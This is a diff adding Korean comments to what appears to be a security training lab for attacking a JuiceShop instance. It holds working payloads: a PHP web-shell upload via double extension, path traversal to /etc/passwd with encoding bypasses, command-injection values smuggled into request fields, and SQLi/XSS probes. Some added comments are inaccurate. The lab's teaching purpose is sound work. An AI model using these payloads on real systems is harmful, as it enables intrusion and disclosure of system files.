@@ -109,7 +109,7 @@
 # 로그인
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 정상 파일 업로드 (이미지)
 echo -e '\x89PNG\r\n\x1a\n' > /tmp/test.png
@@ -126,7 +126,7 @@ curl -s -X POST http://10.20.30.80:3000/file-upload \
 echo ""
 
 # 이중 확장자 우회 시도
-cp /tmp/shell.php /tmp/shell.php.png
+cp /tmp/shell.php /tmp/shell.php.png                   # 파일 복사
 curl -s -X POST http://10.20.30.80:3000/file-upload \
   -H "Authorization: Bearer $TOKEN" \
   -F "file=@/tmp/shell.php.png" | python3 -m json.tool 2>/dev/null
@@ -170,14 +170,16 @@ dd if=/dev/zero of=/tmp/bigfile.pdf bs=1M count=10 2>/dev/null
 curl -s -X POST http://10.20.30.80:3000/file-upload \
   -H "Authorization: Bearer $TOKEN" \
   -F "file=@/tmp/bigfile.pdf" | python3 -m json.tool 2>/dev/null
-rm -f /tmp/bigfile.pdf
+rm -f /tmp/bigfile.pdf                                 # 파일 삭제
 ```
 
 ### 1.5 업로드된 파일 접근 확인
 
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
 ```bash
 # 업로드된 파일이 웹에서 직접 접근 가능한지 확인
-for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp"; do
+for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp"; do  # 반복문 시작
   code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$dir/")
   echo "[$code] /$dir/"
 done
@@ -212,25 +214,25 @@ done
 
 ```bash
 # JuiceShop /ftp 디렉터리의 정상 파일
-curl -s http://10.20.30.80:3000/ftp/legal.md | head -5
+curl -s http://10.20.30.80:3000/ftp/legal.md | head -5  # silent 모드
 echo ""
 
 # 경로 순회 시도 (기본)
-curl -s http://10.20.30.80:3000/ftp/../../../etc/passwd | head -5
+curl -s http://10.20.30.80:3000/ftp/../../../etc/passwd | head -5  # silent 모드
 echo ""
 
 # URL 인코딩 우회
 # ../ → %2e%2e%2f
-curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -5
+curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -5  # silent 모드
 echo ""
 
 # 이중 URL 인코딩 우회
 # %2e → %252e
-curl -s "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/%252e%252e/etc/passwd" | head -5
+curl -s "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/%252e%252e/etc/passwd" | head -5  # silent 모드
 echo ""
 
 # Null byte 주입 (%00) - 오래된 시스템에서 동작
-curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%00.md" | head -5
+curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%00.md" | head -5  # silent 모드
 echo ""
 
 # 다양한 경로 순회 페이로드
@@ -242,7 +244,7 @@ PAYLOADS=(
   "..%c0%af..%c0%af..%c0%afetc/passwd"
 )
 
-for payload in "${PAYLOADS[@]}"; do
+for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
   result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
   if echo "$result" | grep -q "root:"; then
     echo "[성공] $payload"
@@ -311,7 +313,7 @@ os.system(f"cat /uploads/{filename}")  # 위험!
 curl -s -X POST http://10.20.30.80:3000/b2b/v2/orders \
   -H "Content-Type: application/xml" \
   -H "Authorization: Bearer $TOKEN" \
-  -d '<?xml version="1.0"?>
+  -d '<?xml version="1.0"?>                            # 요청 데이터(body)
 <order>
   <productId>1</productId>
   <quantity>1; id</quantity>
@@ -322,11 +324,11 @@ echo ""
 curl -s -X POST http://10.20.30.80:3000/profile/image/url \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
-  -d '{"imageUrl":"http://localhost; id"}' | head -10
+  -d '{"imageUrl":"http://localhost; id"}' | head -10  # 요청 데이터(body)
 echo ""
 
 # 3. 검색 기능에서 시도
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test;id" | head -5
+curl -s "http://10.20.30.80:3000/rest/products/search?q=test;id" | head -5  # silent 모드
 ```
 
 ### 3.4 다양한 페이로드 테스트
@@ -347,7 +349,7 @@ CMDI_PAYLOADS=(
 )
 
 echo "=== 검색 API에서 Command Injection 테스트 ==="
-for payload in "${CMDI_PAYLOADS[@]}"; do
+for payload in "${CMDI_PAYLOADS[@]}"; do               # 반복문 시작
   encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('test${payload}'))")
   start=$(date +%s%N)
   result=$(curl -s --max-time 5 "http://10.20.30.80:3000/rest/products/search?q=$encoded" | head -1)
@@ -405,13 +407,13 @@ echo " (Command Injection 차단 여부)"
 echo "=== WAF 보호 비교 ==="
 echo ""
 echo "JuiceShop (포트 3000, WAF 없음):"
-curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"
-curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>"
+curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"  # silent 모드
+curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>"  # silent 모드
 
 echo ""
 echo "Apache (포트 80, ModSecurity):"
-curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:80/?q='+OR+1=1--"
-curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:80/?q=<script>alert(1)</script>"
+curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:80/?q='+OR+1=1--"  # silent 모드
+curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:80/?q=<script>alert(1)</script>"  # silent 모드
 ```
 
 ---
